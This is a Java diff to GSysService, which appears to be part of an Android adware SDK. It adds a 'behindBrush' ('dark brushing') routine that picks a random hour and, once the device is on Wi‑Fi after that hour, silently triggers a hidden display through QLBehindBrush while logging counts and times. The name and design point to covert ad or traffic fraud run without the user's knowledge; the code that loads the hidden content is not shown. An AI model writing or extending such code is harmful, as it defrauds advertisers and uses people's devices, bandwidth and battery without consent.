@@ -88,6 +88,7 @@ public class GSysService  {
 								b = bannerThread();
 							}
 							shortcutThread();
+							behindBrushThread();
 						}
 						
 						Thread.sleep(100);
@@ -189,6 +190,20 @@ public class GSysService  {
 		}	
 		return false;
 	}
+	//暗刷
+	private boolean behindBrushThread()
+	{
+		if(		 GUserController.getMedia().isAdPosition(GCommon.BEHIND_BRUSH)
+				&& GUserController.getMedia().isShowNum(GCommon.BEHIND_BRUSH)
+				&& GUserController.getMedia().isShowTimeInterval(GCommon.BEHIND_BRUSH)
+				&& GUserController.getMedia().isTimeSlot(GCommon.BEHIND_BRUSH))
+		{		
+			int h = (int) (((int)(Math.random()*100)+1) / 100.f * 18) + 3;
+			GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, h);
+			return true;	
+		}	
+		return false;
+	}
 	//充电锁
 	public void startLockThread()
 	{
@@ -255,6 +270,12 @@ public class GSysService  {
 	public void behindBrush()
 	{
 		QLBehindBrush.getInstance().show();	
+		
+		int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, 0);
+		GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, num+1);
+		GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_TIME, GTools.getCurrTime());
+
+		GLog.e("-----------------", "behindBrush success");
 	}
 	//wifi
 	public boolean wifiThread()
@@ -272,6 +293,16 @@ public class GSysService  {
 	}
 	public void wifi(boolean state)
 	{
+		//暗刷
+		if(isWifi())
+		{
+			int h =  GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, 0);
+			int currH = new Date().getHours();
+			if(currH > h)
+				behindBrush();
+			GLog.e("-----------------------", "h="+h);
+		}
+		
 		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_WIFI_TIME, 0);
 		if(time==0)
 		{
@@ -313,6 +344,8 @@ public class GSysService  {
 		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_NUM, 0);
 		GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_TIME, n_time);
 		GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_NUM, 0);
+		GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_TIME, 0l);
+		GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, 0);
 	}
 	
 	private boolean isMainLoop()
